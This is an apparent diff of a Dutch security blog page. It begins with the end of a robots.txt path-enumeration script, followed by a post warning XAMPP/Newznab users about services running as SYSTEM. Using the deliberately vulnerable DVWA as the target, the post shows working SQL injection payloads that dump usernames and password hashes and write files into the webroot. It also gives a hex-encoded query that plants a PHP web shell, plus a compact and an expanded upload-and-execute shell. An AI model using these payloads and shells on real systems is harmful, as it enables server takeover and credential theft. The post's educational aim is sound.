+    <span class="code_n">rawurl</span> <span class="code_o">=</span> <span class="code_n">url</span><span class="code_o">.</span><span class="code_n">strip</span><span class="code_p">(</span><span class="code_s1">&#39;https://&#39;</span><span class="code_p">)</span>
+    <span class="code_n">socket</span><span class="code_o">.</span><span class="code_n">gethostbyname</span><span class="code_p">(</span><span class="code_n">rawurl</span><span class="code_p">)</span>
+<span class="code_k">except</span><span class="code_p">:</span>
+    <span class="code_k">print</span> <span class="code_s1">&#39;</span><span class="code_se">\033</span><span class="code_s1">[91m[-]</span><span class="code_se">\033</span><span class="code_s1">[0m Could not revolve &quot;&#39;</span> <span class="code_o">+</span> <span class="code_n">url</span> <span class="code_o">+</span> <span class="code_s1">&#39;&quot;&#39;</span>
+    <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">exit</span><span class="code_p">()</span>
+
+<span class="code_c1"># Parse command line</span>
+<span class="code_k">if</span> <span class="code_p">(</span><span class="code_s1">&#39;-h&#39;</span> <span class="code_ow">in</span> <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_p">)</span> <span class="code_ow">or</span> <span class="code_p">(</span><span class="code_s1">&#39;--help&#39;</span> <span class="code_ow">in</span> <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_p">):</span>
+    <span class="code_k">print</span> <span class="code_n">helptext</span>
+    <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">exit</span><span class="code_p">()</span>
+
+<span class="code_k">if</span> <span class="code_s1">&#39;-P&#39;</span> <span class="code_ow">in</span> <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_p">:</span>
+    <span class="code_n">proxyaddr</span> <span class="code_o">=</span> <span class="code_n">urllib2</span><span class="code_o">.</span><span class="code_n">unquote</span><span class="code_p">(</span><span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_p">[</span><span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_o">.</span><span class="code_n">index</span><span class="code_p">(</span><span class="code_s1">&#39;-P&#39;</span><span class="code_p">)</span> <span class="code_o">+</span> <span class="code_mi">1</span><span class="code_p">])</span>
+    <span class="code_n">proxy</span> <span class="code_o">=</span> <span class="code_n">urllib2</span><span class="code_o">.</span><span class="code_n">ProxyHandler</span><span class="code_p">({</span><span class="code_s1">&#39;http&#39;</span><span class="code_p">:</span> <span class="code_n">proxyaddr</span><span class="code_p">})</span>
+    <span class="code_n">opener</span> <span class="code_o">=</span> <span class="code_n">urllib2</span><span class="code_o">.</span><span class="code_n">build_opener</span><span class="code_p">(</span><span class="code_n">proxy</span><span class="code_p">)</span>
+    <span class="code_n">urllib2</span><span class="code_o">.</span><span class="code_n">install_opener</span><span class="code_p">(</span><span class="code_n">opener</span><span class="code_p">)</span>
+
+<span class="code_k">if</span> <span class="code_s1">&#39;-t&#39;</span> <span class="code_ow">in</span> <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_p">:</span>
+    <span class="code_n">timeout</span> <span class="code_o">=</span> <span class="code_nb">int</span><span class="code_p">(</span><span class="code_n">urllib2</span><span class="code_o">.</span><span class="code_n">unquote</span><span class="code_p">(</span><span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_p">[</span><span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_o">.</span><span class="code_n">index</span><span class="code_p">(</span><span class="code_s1">&#39;-t&#39;</span><span class="code_p">)</span> <span class="code_o">+</span> <span class="code_mi">1</span><span class="code_p">]))</span>
+<span class="code_k">else</span><span class="code_p">:</span>
+    <span class="code_n">timeout</span> <span class="code_o">=</span> <span class="code_mi">1</span>
+
+<span class="code_k">if</span> <span class="code_s1">&#39;-v&#39;</span> <span class="code_ow">in</span> <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_p">:</span>
+    <span class="code_n">verbose</span> <span class="code_o">=</span> <span class="code_mi">1</span>
+
+<span class="code_c1">## Functions</span>
+<span class="code_c1"># Get all &quot;Disallow: &quot; lines</span>
+<span class="code_k">def</span> <span class="code_nf">getdisallow</span><span class="code_p">(</span><span class="code_n">url</span><span class="code_p">):</span>
+    <span class="code_n">disallow</span> <span class="code_o">=</span> <span class="code_p">[]</span>
+    <span class="code_k">try</span><span class="code_p">:</span>
+        <span class="code_n">req</span> <span class="code_o">=</span> <span class="code_n">urllib2</span><span class="code_o">.</span><span class="code_n">urlopen</span><span class="code_p">(</span><span class="code_n">url</span> <span class="code_o">+</span> <span class="code_s1">&#39;/robots.txt&#39;</span><span class="code_p">)</span>
+        <span class="code_n">status</span> <span class="code_o">=</span> <span class="code_n">req</span><span class="code_o">.</span><span class="code_n">getcode</span><span class="code_p">()</span>
+        <span class="code_k">print</span> <span class="code_s1">&#39;</span><span class="code_se">\033</span><span class="code_s1">[92m[+]</span><span class="code_se">\033</span><span class="code_s1">[0m &#39;</span> <span class="code_o">+</span> <span class="code_nb">str</span><span class="code_p">(</span><span class="code_n">status</span><span class="code_p">)</span> <span class="code_o">+</span> <span class="code_s1">&#39; | robots.txt&#39;</span>
+
+    <span class="code_k">except</span> <span class="code_ne">Exception</span><span class="code_p">,</span> <span class="code_n">error</span><span class="code_p">:</span>
+        <span class="code_k">try</span><span class="code_p">:</span>
+            <span class="code_k">print</span> <span class="code_s1">&#39;</span><span class="code_se">\033</span><span class="code_s1">[91m[-]</span><span class="code_se">\033</span><span class="code_s1">[0m &#39;</span> <span class="code_o">+</span> <span class="code_nb">str</span><span class="code_p">(</span><span class="code_n">error</span><span class="code_o">.</span><span class="code_n">code</span><span class="code_p">)</span> <span class="code_o">+</span> <span class="code_s1">&#39; | robots.txt&#39;</span>
+        <span class="code_k">except</span><span class="code_p">:</span>
+            <span class="code_k">print</span> <span class="code_s1">&#39;</span><span class="code_se">\033</span><span class="code_s1">[91m[-]</span><span class="code_se">\033</span><span class="code_s1">[0m Error: &#39;</span> <span class="code_o">+</span> <span class="code_nb">str</span><span class="code_p">(</span><span class="code_n">error</span><span class="code_p">)</span>
+        <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">exit</span><span class="code_p">()</span>
+    
+    <span class="code_n">robots</span> <span class="code_o">=</span> <span class="code_n">req</span><span class="code_o">.</span><span class="code_n">readlines</span><span class="code_p">()</span>
+    <span class="code_k">for</span> <span class="code_n">line</span> <span class="code_ow">in</span> <span class="code_n">robots</span><span class="code_p">:</span>
+        <span class="code_k">if</span> <span class="code_s1">&#39;Disallow:&#39;</span> <span class="code_ow">in</span> <span class="code_n">line</span><span class="code_p">:</span>
+            <span class="code_k">if</span> <span class="code_p">(</span><span class="code_s1">&#39;Disallow: /</span><span class="code_se">\n</span><span class="code_s1">&#39;</span> <span class="code_ow">not</span> <span class="code_ow">in</span> <span class="code_n">line</span><span class="code_p">)</span> <span class="code_ow">and</span> <span class="code_p">(</span><span class="code_s1">&#39;Disallow: /*</span><span class="code_se">\n</span><span class="code_s1">&#39;</span> <span class="code_ow">not</span> <span class="code_ow">in</span> <span class="code_n">line</span><span class="code_p">):</span>
+                <span class="code_n">disallow</span><span class="code_o">.</span><span class="code_n">append</span><span class="code_p">(</span><span class="code_n">line</span><span class="code_p">)</span>
+    <span class="code_k">return</span> <span class="code_n">disallow</span>
+
+<span class="code_c1"># Get all URI titles</span>
+<span class="code_k">def</span> <span class="code_nf">getcontent</span><span class="code_p">(</span><span class="code_n">uri</span><span class="code_p">):</span>
+    <span class="code_k">for</span> <span class="code_n">uri</span> <span class="code_ow">in</span> <span class="code_n">uris</span><span class="code_p">:</span>
+        <span class="code_k">try</span><span class="code_p">:</span>
+            <span class="code_n">req</span> <span class="code_o">=</span> <span class="code_n">urllib2</span><span class="code_o">.</span><span class="code_n">urlopen</span><span class="code_p">(</span><span class="code_n">url</span> <span class="code_o">+</span> <span class="code_n">uri</span><span class="code_p">)</span>
+            <span class="code_n">status</span> <span class="code_o">=</span> <span class="code_nb">str</span><span class="code_p">(</span><span class="code_n">req</span><span class="code_o">.</span><span class="code_n">getcode</span><span class="code_p">())</span>
+            <span class="code_n">html</span> <span class="code_o">=</span> <span class="code_n">BeautifulSoup</span><span class="code_p">(</span><span class="code_n">req</span><span class="code_p">)</span>
+            <span class="code_k">try</span><span class="code_p">:</span>
+                <span class="code_n">title</span> <span class="code_o">=</span> <span class="code_n">html</span><span class="code_o">.</span><span class="code_n">title</span><span class="code_o">.</span><span class="code_n">string</span>
+                <span class="code_n">title</span> <span class="code_o">=</span> <span class="code_n">title</span><span class="code_o">.</span><span class="code_n">strip</span><span class="code_p">(</span><span class="code_s1">&#39;</span><span class="code_se">\n</span><span class="code_s1">&#39;</span><span class="code_p">)</span>
+                <span class="code_n">title</span> <span class="code_o">=</span> <span class="code_n">title</span><span class="code_o">.</span><span class="code_n">strip</span><span class="code_p">(</span><span class="code_s1">&#39;</span><span class="code_se">\t</span><span class="code_s1">&#39;</span><span class="code_p">)</span>
+            <span class="code_k">except</span><span class="code_p">:</span>
+                <span class="code_n">title</span> <span class="code_o">=</span> <span class="code_s1">&#39;No title&#39;</span>
+
+            <span class="code_k">print</span> <span class="code_s1">&#39;</span><span class="code_se">\033</span><span class="code_s1">[92m[+]</span><span class="code_se">\033</span><span class="code_s1">[0m &#39;</span> <span class="code_o">+</span> <span class="code_n">status</span> <span class="code_o">+</span> <span class="code_s1">&#39; | &#39;</span> <span class="code_o">+</span> <span class="code_n">uri</span><span class="code_o">.</span><span class="code_n">rstrip</span><span class="code_p">()</span> <span class="code_o">+</span> <span class="code_s1">&#39; | &quot;&#39;</span> <span class="code_o">+</span> <span class="code_n">title</span><span class="code_o">.</span><span class="code_n">rstrip</span><span class="code_p">()</span> <span class="code_o">+</span> <span class="code_s1">&#39;&quot; | &#39;</span> <span class="code_o">+</span> <span class="code_n">url</span> <span class="code_o">+</span> <span class="code_n">uri</span><span class="code_o">.</span><span class="code_n">rstrip</span><span class="code_p">()</span>
+        <span class="code_k">except</span> <span class="code_n">urllib2</span><span class="code_o">.</span><span class="code_n">URLError</span><span class="code_p">,</span> <span class="code_n">error</span><span class="code_p">:</span>
+            <span class="code_k">try</span><span class="code_p">:</span>
+                <span class="code_k">if</span> <span class="code_n">verbose</span><span class="code_p">:</span>
+                    <span class="code_k">print</span> <span class="code_s1">&#39;</span><span class="code_se">\033</span><span class="code_s1">[91m[-]</span><span class="code_se">\033</span><span class="code_s1">[0m &#39;</span> <span class="code_o">+</span> <span class="code_nb">str</span><span class="code_p">(</span><span class="code_n">error</span><span class="code_o">.</span><span class="code_n">code</span><span class="code_p">)</span> <span class="code_o">+</span> <span class="code_s1">&#39; | &#39;</span> <span class="code_o">+</span> <span class="code_n">uri</span><span class="code_o">.</span><span class="code_n">rstrip</span><span class="code_p">()</span>
+            <span class="code_k">except</span><span class="code_p">:</span>
+                <span class="code_k">pass</span>
+        <span class="code_n">time</span><span class="code_o">.</span><span class="code_n">sleep</span><span class="code_p">(</span><span class="code_n">timeout</span><span class="code_p">)</span>
+
+<span class="code_c1">## Running code</span>
+<span class="code_c1"># Fill &#39;uris&#39; array</span>
+<span class="code_n">uris</span> <span class="code_o">=</span> <span class="code_p">[]</span>
+<span class="code_n">disallow</span> <span class="code_o">=</span> <span class="code_n">getdisallow</span><span class="code_p">(</span><span class="code_n">url</span><span class="code_p">)</span>
+
+<span class="code_k">if</span> <span class="code_ow">not</span> <span class="code_n">disallow</span><span class="code_p">:</span>
+    <span class="code_k">print</span> <span class="code_s1">&#39;No &quot;Disallow:&quot; entries in robots.txt.&#39;</span>
+<span class="code_k">else</span><span class="code_p">:</span>
+    <span class="code_k">for</span> <span class="code_n">entry</span> <span class="code_ow">in</span> <span class="code_n">disallow</span><span class="code_p">:</span>
+        <span class="code_n">entry</span> <span class="code_o">=</span> <span class="code_n">entry</span><span class="code_o">.</span><span class="code_n">strip</span><span class="code_p">(</span><span class="code_s1">&#39;Disallow: &#39;</span><span class="code_p">)</span>
+        <span class="code_n">uris</span><span class="code_o">.</span><span class="code_n">append</span><span class="code_p">(</span><span class="code_n">entry</span><span class="code_p">)</span>
+
+<span class="code_c1"># Request all URI&#39;s</span>
+<span class="code_n">getcontent</span><span class="code_p">(</span><span class="code_n">uris</span><span class="code_p">)</span></pre></div></td></tr></table></div><br>
+<br>
+<a href="https://github.com/Slurpgeit/Slurpgeit/blob/master/scripts/getrobots.py" rel="external nofollow" title="https://github.com/Slurpgeit/Slurpgeit/blob/master/scripts/getrobots.py">https://github.com/Slurpg...ster/scripts/getrobots.py</a></div>
+			</div>
+			<div class="blogpost">
+				<h2><a href="https://autopwn.tweakblogs.net/blog/8689/chpwn.html">chpwn</a></h2>
+				<p class="author">
+					Door <a href="https://tweakers.net/gallery/98264/" rel="nofollow">Slurpgeit</a> op maandag 11 februari 2013 22:18 - <a href="https://autopwn.tweakblogs.net/blog/8689/chpwn.html#reacties">Reacties (13)</a><br>Categorie: -, Views: 7.070
+				</p>
+				<div class="article">Dit verhaaltje komt eigenlijk doordat ik wel eens wat lees in het <a href="https://gathering.tweakers.net/forum/list_messages/1528986" rel="external">Newznab</a> topic. Iedereen moet natuurlijk wel makkelijk die thuiskopietjes van zijn / haar muziek en films kunnen binnenhalen <img src="https://tweakers.net/g/s/smile.gif" width="15" height="15" alt=":)">. <br>
+<br>
+Wat mij echter opviel is dat meerdere tweakers aanbevelen om tijdens de installatie <a href="https://mandark.tweakblogs.net/blog/8529/tutorial-newznab+-installatie-(ubuntu-percona-nginx-)-en-download-vm.html" rel="external">de webuser alle rechten te geven op de newznab map</a>, of om <a href="https://gathering.tweakers.net/forum/list_message/39434253#39434253" rel="external">alle bestanden wereldwijd lees- en schrijfbaar</a> te maken. Dit is, om het zwak uit te drukken, een erg slecht idee (Begrijp me niet verkeerd, dit is geen bashen. Meer, informeren <img src="https://tweakers.net/g/s/smile.gif" width="15" height="15" alt=":)"> ).<br>
+<br>
+Ook zie ik een hoop mensen XAMPP gebruiken om op Windows een webservertje te draaien. Deze heeft eigenlijk hetzelfde probleem. Vandaar dat dit keer het blogje opgedeeld gaat worden in twee scenario's.<br>
+<br>
+<b>Windows met XAMPP</b><br>
+Het leuke van deze setup is, dat bij een standaard installatie de XAMPP services (Apache, MySQL, etc) als de &quot;SYSTEM&quot; gebruiker draaien, de gebruiker met de hoogste rechten binnen een Windows omgeving:<br>
+<img src="https://tweakers.net/camo/de3b6322d4be307db754f9e25dd071d041e6e425/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fwindows_system.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/windows_system.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/windows_system.png"><br>
+<br>
+Het probleem hiermee is dat als er een fout ontdekt wordt in Newznab (of als je een andere kwetsbare applicatie op dezelfde server host) een aanvaller met meerdere vingers in zijn / haar neus de server kan overnemen. Hoe? Read on..<br>
+<br>
+Ok, denk even mee. Naast Newznab heb je dus nog een website draaien op je webserver. En deze is kwetsbaar voor <a href="http://en.wikipedia.org/wiki/SQL_injection" rel="external nofollow">SQL-Injection</a>. In mijn geval heb ik de &quot;<a href="http://www.dvwa.co.uk/" rel="external nofollow">Damn Vulnerable WebApp</a>&quot; gedownload en op mijn Windows server gezet. Dit is een softwarepakketje wat met opzet lek is voor allerlei dingen, je weet wel, om mee te spelen <img src="https://tweakers.net/g/s/smile.gif" width="15" height="15" alt=":)">.<br>
+<br>
+De standaard SQLMAP / HAVIJ scriptjongere zal hier al wat standaard truukjes mee uit kunnen halen. Ik denk aan usernames en wachtwoorden achterhalen door te zoeken op:<br>
+<div class="cmd"><pre>1' union all select concat(user,':',password),'' from users -- </pre></div><br>
+<img src="https://tweakers.net/camo/5e1d902eef2dc122b90a9c88a6959c92820fe123/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Funion_select.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/union_select.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/union_select.png"><br>
+(Wat je hier ziet is gebruikersnamen en wachtwoorden in het formaat &lt;gebruiker&gt;:&lt;wachtwoord in md5 hash&gt;).<br>
+<br>
+Je zou deze eventueel ook nog vrij makkelijk kunnen kraken:<br>
+<img src="https://tweakers.net/camo/9b16afa67c47f72490900b39a13697a559685458/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fjohn.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/john.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/john.png"><br>
+<br>
+Maaarrrrrrrrr, dat is nog niet alles! Omdat MySQL hier als &quot;SYSTEM&quot; draait, heeft het proces ook toegang tot (bijna) alle bestanden en mappen. Daarnaast kan MySQL resultaat ook nog eens wegschrijven naar een bestand. Dus als we de volgende query uitvoeren:<br>
+<div class="cmd"><pre>1' union all select 'hello world','' into dumpfile 'c:/xampp/htdocs/hello.html' -- </pre></div><br>
+<br>
+zal MySQL de tekst &quot;hello world&quot; in het bestand &quot;c:\xampp\htdocs\hello.html&quot; (de standaard webroot van XAMPP) zetten. Dit kan je vervolgens ook nog eens controleren door naar de website/hello.html te surfen:<br>
+<img src="https://tweakers.net/camo/bcd7ae8f7a247422e7d39ec28ba4269ea89372f4/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fhelloworld.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/helloworld.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/helloworld.png"><br>
+(adminadmin staat erbij omdat dat de output van de normale zoekfuntionaliteit is.)<br>
+<br>
+Cool! Maar, aan alleen HTML hebben we niks. Laat de server nu ook PHP ondersteunen.. Maar wat kan PHP voor ons betekenen in deze aanval? Denk even aan het volgende kleine stukje PHP code:<br>
+<div class="code">PHP:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+</pre></td><td class="phphighlightcode"><div><pre><span class="code_cp">&lt;?php</span> <span class="code_k">echo</span> <span class="code_s2">&quot;&lt;pre&gt;&quot;</span><span class="code_o">.</span><span class="code_nb">htmlentities</span><span class="code_p">(</span><span class="code_nb">shell_exec</span><span class="code_p">(</span><span class="code_nv">$_GET</span><span class="code_p">[</span><span class="code_s1">&#39;cmd&#39;</span><span class="code_p">]))</span><span class="code_o">.</span><span class="code_s2">&quot;&lt;/pre&gt;&quot;</span><span class="code_p">;</span> <span class="code_cp">?&gt;</span><span class="code_x"></span></pre></div></td></tr></table></div><br>
+<br>
+Misschien dat je het al herkent, maar dit stukje PHP voert een commando wat je meegeeft in de url (?cmd=dir, bijvoorbeeld) uit op het onderliggende systeem, en geeft de output terug. Nu moeten we het alleen op het systeem krijgen. Door de rare tekens ($, ', &quot;, ;, etc) kan het nog wel eens fout gaan. Maar, gelukkig, kan MySQL ook overweg met Hexadecimale karakters. Dus, even de code omzetten van ASCII naar HEX:<br>
+<img src="https://tweakers.net/camo/4907c6cd3732ce49aae76ff634c1d633cc2c8dce/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fasciihex.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/asciihex.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/asciihex.png"><br>
+<br>
+En aan MySQL doorgeven met de volgende query:<br>
+<div class="cmd"><pre>1' union all select 0x3c3f706870206563686f20223c7072653e222e68746d6c656e746974696573287368656c6c5f6578656328245f4745545b27636d64275d29292e223c2f7072653e223b203f3e,'' into dumpfile 'c:/xampp/htdocs/shell.php' -- </pre></div> <br>
+<br>
+Even kijken of het gewerkt heeft:<br>
+<img src="https://tweakers.net/camo/a4de3f67129ac4525dc870e78b235f30cd7716f4/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fshell.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/shell.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/shell.png"><br>
+<br>
+<img src="https://tweakers.net/camo/9bef5f1f3b7d4c102c36585990d250924c09edfb/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fwhoami_win.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/whoami_win.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/whoami_win.png"><br>
+<br>
+W00p! Oke, dus we kunnen commando's op de server uitvoeren als &quot;SYSTEM&quot;. Alleen  is deze shell verder vrij beperkt. Ik heb even snel een iets uitgebreider shelletje gemaakt:<br>
+<img src="https://tweakers.net/camo/faca2d949680e1cba03feddbe3aaf83810e961c6/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fsimshell.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/simshell.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/simshell.png"><br>
+<br>
+Hij is met opzet wat onleesbaar, omdat hij gemaakt is om via een URL te injecteren. Daarom is hij zo compact mogelijk. Mocht je hem ook willen testen:<br>
+<div class="code">PHP:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+</pre></td><td class="phphighlightcode"><div><pre><span class="code_cp">&lt;?php</span> <span class="code_nb">error_reporting</span><span class="code_p">(</span><span class="code_mi">0</span><span class="code_p">);</span><span class="code_k">if</span><span class="code_p">(</span><span class="code_nv">$_SERVER</span><span class="code_p">[</span><span class="code_s1">&#39;REMOTE_ADDR&#39;</span><span class="code_p">]</span><span class="code_o">==</span><span class="code_s1">&#39;192.168.1.202&#39;</span><span class="code_p">){</span><span class="code_nv">$he</span><span class="code_o">=</span><span class="code_nb">htmlentities</span><span class="code_p">;</span><span class="code_nv">$fo</span><span class="code_o">=</span><span class="code_s2">&quot;&lt;form method=post &quot;</span><span class="code_p">;</span><span class="code_nv">$it</span><span class="code_o">=</span><span class="code_s2">&quot; &lt;input type=&quot;</span><span class="code_p">;</span><span class="code_k">echo</span><span class="code_nv">$fo</span><span class="code_o">.</span><span class="code_s2">&quot;enctype=multipart/form-data&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;file name=f&gt; To: &quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;text name=l value=&#39;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_nb">str_replace</span><span class="code_p">(</span><span class="code_s1">&#39;\\&#39;</span><span class="code_p">,</span><span class="code_s1">&#39;/&#39;</span><span class="code_p">,</span><span class="code_nb">getcwd</span><span class="code_p">()))</span><span class="code_o">.</span><span class="code_s2">&quot;&#39;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;submit value=Up&gt;&quot;</span><span class="code_p">;</span><span class="code_nv">$fs</span><span class="code_o">=</span><span class="code_nv">$_FILES</span><span class="code_p">[</span><span class="code_s1">&#39;f&#39;</span><span class="code_p">];</span><span class="code_k">if</span> <span class="code_p">(</span><span class="code_nb">isset</span><span class="code_p">(</span><span class="code_nv">$fs</span><span class="code_p">)){</span><span class="code_nb">move_uploaded_file</span><span class="code_p">(</span><span class="code_nv">$fs</span><span class="code_p">[</span><span class="code_s1">&#39;tmp_name&#39;</span><span class="code_p">],</span><span class="code_nv">$_POST</span><span class="code_p">[</span><span class="code_s1">&#39;l&#39;</span><span class="code_p">]</span><span class="code_o">.</span><span class="code_s1">&#39;/&#39;</span><span class="code_o">.</span><span class="code_nv">$fs</span><span class="code_p">[</span><span class="code_s1">&#39;name&#39;</span><span class="code_p">]);</span><span class="code_k">echo</span><span class="code_s2">&quot; Upped!&quot;</span><span class="code_p">;}</span><span class="code_nv">$gc</span><span class="code_o">=</span><span class="code_nv">$_POST</span><span class="code_p">[</span><span class="code_s1">&#39;c&#39;</span><span class="code_p">];</span><span class="code_k">echo</span><span class="code_s2">&quot;&lt;/form&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$fo</span><span class="code_o">.</span><span class="code_s2">&quot;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;text name=c value=&#39;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_nv">$gc</span><span class="code_p">)</span><span class="code_o">.</span><span class="code_s2">&quot;&#39;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;submit value=Execute&gt;&quot;</span><span class="code_p">;</span><span class="code_k">if</span><span class="code_p">(</span><span class="code_nb">isset</span><span class="code_p">(</span><span class="code_nv">$gc</span><span class="code_p">)){</span><span class="code_k">echo</span><span class="code_s2">&quot;&lt;pre&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_sb">`$gc 2&gt;&amp;1`</span><span class="code_p">)</span><span class="code_o">.</span><span class="code_s2">&quot;&lt;/pre&gt;&quot;</span><span class="code_p">;}}</span><span class="code_cp">?&gt;</span><span class="code_x"></span></pre></div></td></tr></table></div><br>
+<br>
+Zo zou hij eruit zien als het normale PHP was geweest:<br>
+<div class="code">PHP:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="phphighlightcode"><div><pre><span class="code_cp">&lt;?php</span> 
+<span class="code_nb">error_reporting</span><span class="code_p">(</span><span class="code_mi">0</span><span class="code_p">);</span>
+
+<span class="code_k">if</span><span class="code_p">(</span><span class="code_nv">$_SERVER</span><span class="code_p">[</span><span class="code_s1">&#39;REMOTE_ADDR&#39;</span><span class="code_p">]</span><span class="code_o">==</span><span class="code_s1">&#39;192.168.1.202&#39;</span><span class="code_p">){</span>
+    <span class="code_nv">$he</span><span class="code_o">=</span><span class="code_nb">htmlentities</span><span class="code_p">;</span>
+    <span class="code_nv">$fo</span><span class="code_o">=</span><span class="code_s2">&quot;&lt;form method=post &quot;</span><span class="code_p">;</span>
+    <span class="code_nv">$it</span><span class="code_o">=</span><span class="code_s2">&quot; &lt;input type=&quot;</span><span class="code_p">;</span>
+    
+    <span class="code_k">echo</span> <span class="code_nv">$fo</span><span class="code_o">.</span><span class="code_s2">&quot;enctype=multipart/form-data&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;file name=f&gt; To: &quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;text name=l value=&#39;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_nb">str_replace</span><span class="code_p">(</span><span class="code_s1">&#39;\\&#39;</span><span class="code_p">,</span><span class="code_s1">&#39;/&#39;</span><span class="code_p">,</span><span class="code_nb">getcwd</span><span class="code_p">()))</span><span class="code_o">.</span><span class="code_s2">&quot;&#39;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;submit value=Up&gt;&quot;</span><span class="code_p">;</span>
+    
+    <span class="code_nv">$fs</span><span class="code_o">=</span><span class="code_nv">$_FILES</span><span class="code_p">[</span><span class="code_s1">&#39;f&#39;</span><span class="code_p">];</span>
+    <span class="code_k">if</span> <span class="code_p">(</span><span class="code_nb">isset</span><span class="code_p">(</span><span class="code_nv">$fs</span><span class="code_p">)){</span>
+        <span class="code_nb">move_uploaded_file</span><span class="code_p">(</span><span class="code_nv">$fs</span><span class="code_p">[</span><span class="code_s1">&#39;tmp_name&#39;</span><span class="code_p">],</span><span class="code_nv">$_POST</span><span class="code_p">[</span><span class="code_s1">&#39;l&#39;</span><span class="code_p">]</span><span class="code_o">.</span><span class="code_s1">&#39;/&#39;</span><span class="code_o">.</span><span class="code_nv">$fs</span><span class="code_p">[</span><span class="code_s1">&#39;name&#39;</span><span class="code_p">]);</span>
+        <span class="code_k">echo</span><span class="code_s2">&quot; Upped!&quot;</span><span class="code_p">;</span>
+    <span class="code_p">}</span>
+    
+    <span class="code_nv">$gc</span><span class="code_o">=</span><span class="code_nv">$_POST</span><span class="code_p">[</span><span class="code_s1">&#39;c&#39;</span><span class="code_p">];</span>
+    <span class="code_k">echo</span><span class="code_s2">&quot;&lt;/form&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$fo</span><span class="code_o">.</span><span class="code_s2">&quot;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;text name=c value=&#39;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_nv">$gc</span><span class="code_p">)</span><span class="code_o">.</span><span class="code_s2">&quot;&#39;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;submit value=Execute&gt;&quot;</span><span class="code_p">;</span>
+    <span class="code_k">if</span><span class="code_p">(</span><span class="code_nb">isset</span><span class="code_p">(</span><span class="code_nv">$gc</span><span class="code_p">)){</span>
+        <span class="code_k">echo</span><span class="code_s2">&quot;&lt;pre&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_sb">`$gc 2&gt;&amp;1`</span><span class="code_p">)</span><span class="code_o">.</span><span class="code_s2">&quot;&lt;/pre&gt;&quot;</span><span class="code_p">;</span>
+    <span class="code_p">}</span>
+<span class="code_p">}</span>
